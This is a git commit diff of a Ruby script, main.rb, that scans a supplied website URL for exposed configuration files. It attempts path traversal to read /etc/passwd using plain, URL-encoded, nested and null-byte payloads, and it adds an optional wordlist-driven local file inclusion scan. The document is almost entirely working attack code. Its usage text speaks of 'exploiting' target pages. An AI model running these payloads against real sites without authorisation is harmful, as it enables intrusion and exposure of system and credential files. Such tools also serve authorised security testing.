48395a6bb967eead2157d575c686f4e4fcff14e3
Luka Miletic <112261868+mileticluka1@users.noreply.github.com>
2024-03-20 22:40:18 +0100

    Update main.rb

--- main.rb
+++ main.rb
@@ -1,5 +1,4 @@
 require 'net/http'
-require 'open-uri'
 
 def check_file(url, file)
   uri = URI.join(url, file)
@@ -25,133 +24,70 @@ def check_file(url, file)
     puts "Unexpected error for #{file}: #{response.code} #{response.message}"
     return false
   end
+rescue StandardError => e
+  puts "Error checking #{file}: #{e.message}"
+  return false
 end
 
-def check_robots_txt(url)
-  check_file(url, 'robots.txt')
+def check_vulnerabilities(url, payloads, wordlist_file = nil, skip_default_payloads = false)
+  default_payloads = [
+    "robots.txt",
+    "sitemap.xml",
+    "README.md",
+    "php.ini",
+    "web.config",
+    ".htaccess",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "etc/passwd",
+    "....//....//etc/passwd",
+    "../../../../etc/passwd%00.png",
+    "var/www/html/../../../etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "etc%2Fpasswd",
+    "....%2F%2F....%2F%2Fetc%2Fpasswd"
+  ]
+
+  puts "\nStarting vulnerability scan..."
+  puts "==============================="
+
+  unless skip_default_payloads
+    puts "\nRunning default payload scan..."
+    default_payloads.each do |payload|
+      puts "\n#{payload} exists: #{check_file(url, payload)}"
+    end
+  end
+
+  if wordlist_file
+    puts "\nRunning LFI scan with custom wordlist..."
+    run_lfi_scan(url, wordlist_file)
+  end
 end
 
-def check_sitemap_xml(url)
-  check_file(url, 'sitemap.xml')
-end
+def run_lfi_scan(url, wordlist_file)
+  puts "Running LFI scan with wordlist: #{wordlist_file}"
 
-def check_htaccess(url)
-  check_file(url, '.htaccess')
-end
-
-def check_phpini(url)
-  check_file(url, 'php.ini')
-end
-
-def check_readme(url)
-  check_file(url, 'README.md')
-end
-
-def check_webconfig(url)
-  check_file(url, 'web.config')
-end
-
-def check_pathtraversal3(url)
-  check_file(url, '../../../etc/passwd')
-end
-
-def check_pathtraversal4(url)
-  check_file(url, '../../../../etc/passwd')
-end
-
-def check_pathtraversal1(url)
-  check_file(url, 'etc/passwd')
-end
-
-def check_pathtraversalnesting(url)
-  check_file(url, '....//....//etc/passwd')
-end
-
-def check_pathtraversal3encoded(url)
-  check_file(url, '..%2F..%2F..%2Fetc%2Fpasswd')
-end
-
-def check_pathtraversal4encoded(url)
-  check_file(url, '..%2F..%2F..%2F..%2Fetc%2Fpasswd')
-end
-
-def check_pathtraversal1encoded(url)
-  check_file(url, 'etc%2Fpasswd')
-end
-
-def check_pathtraversalnestingencoded(url)
-  check_file(url, '....%2F%2F....%2F%2Fetc%2Fpasswd')
-end
-
-def check_pathtraversalnullbytepng(url)
-  check_file(url, '../../../../etc/passwd%00.png')
-end
-
-def check_pathtraversalfullpath(url)
-  check_file(url, 'var/www/html/../../../etc/passwd')
+  File.readlines(wordlist_file).each do |line|
+    lfi_payload = line.chomp
+    puts "\n#{lfi_payload} exists: #{check_file(url, lfi_payload)}"
+  end
 end
 
 def usage
-  puts "Usage: ruby script.rb <website_url>"
-  puts "Must include / on the end if exploiting the index page. Example <https://example.com/>"
-  puts "In case of exploiting fileviewer paste it in this format <https://example.com/view=>"
+  puts "Usage: ruby script.rb <website_url> [--wordlist <wordlist_file>] [--skip-default-payloads]"
+  puts "Example: ruby script.rb https://example.com --wordlist wordlist.txt --skip-default-payloads"
+  puts "Wordlist file is optional."
 end
 
 if ARGV.empty?
   usage
 else
-  website_url = ARGV[0]
-  puts "Checking robots.txt..."
-  puts "Robots.txt exists: #{check_robots_txt(website_url)}"
+  website_url = ARGV.shift
+  payloads = ARGV.shift(ARGV.index { |arg| arg.start_with?('-') } || ARGV.size)
+  wordlist_index = ARGV.index("--wordlist")
+  wordlist_file = ARGV[wordlist_index + 1] if wordlist_index
+  skip_default_payloads = ARGV.include?("--skip-default-payloads")
 
-  puts "\nChecking sitemap.xml..."
-  puts "Sitemap.xml exists: #{check_sitemap_xml(website_url)}"
-
-  puts "\nChecking .htaccess..."
-  puts ".htaccess exists: #{check_htaccess(website_url)}"
-
-  puts "\nChecking php.ini"
-  puts "php.ini exists: #{check_phpini(website_url)}"
-
-  puts "\nChecking README.md"
-  puts "README.md exists: #{check_readme(website_url)}"
-
-  puts "\nChecking web.config"
-  puts "web.config exists: #{check_readme(website_url)}"
-
-  puts "\nPATH TRAVERSAL SCAN STARTING..."
-  puts "================================="
-
-  puts "\nChecking ../../../etc/passwd ..."
-  puts "Path traversal detected: #{check_pathtraversal3(website_url)}"
-
-  puts "\nChecking ../../../../etc/passwd ..."
-  puts "Path traversal detected: #{check_pathtraversal4(website_url)}"
-
-  puts "\nChecking /etc/passwd ..."
-  puts "Path traversal detected: #{check_pathtraversal1(website_url)}"
-
-  puts "\nChecking ....//....//etc/passwd ..."
-  puts "Path traversal detected: #{check_pathtraversalnesting(website_url)}"
-
-  puts "\nChecking the nullbyte vulnerability /../../../../etc/passwd%00.png ..."
-  puts "Path traversal detected: #{check_pathtraversalnullbytepng(website_url)}"
-
-  puts "\nChecking /var/www/html/../../../etc/passwd"
-  puts "Path traversal detected: #{check_pathtraversalfullpath(website_url)}"
-  
-  puts "\nChecking the URL Encoding path traversal vulnerabilities!"
-  puts "==========================================================="
-
-  puts "\nChecking %2F..%2F..%2F..%2Fetc%2Fpasswd"
-  puts "Path traversal detected: #{check_pathtraversal3encoded(website_url)}"
-
-  puts "\nChecking %2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
-  puts "Path traversal detected: #{check_pathtraversal4encoded(website_url)}"
-
-  puts "\nChecking %2Fetc%2Fpasswd"
-  puts "Path traversal detected: #{check_pathtraversal1encoded(website_url)}"
-
-  puts "\nChecking %2F....%2F%2F....%2F%2Fetc%2Fpasswd"
-  puts "Path traversal detected: #{check_pathtraversalnestingencoded(website_url)}"
+  check_vulnerabilities(website_url, payloads, wordlist_file, skip_default_payloads)
 end
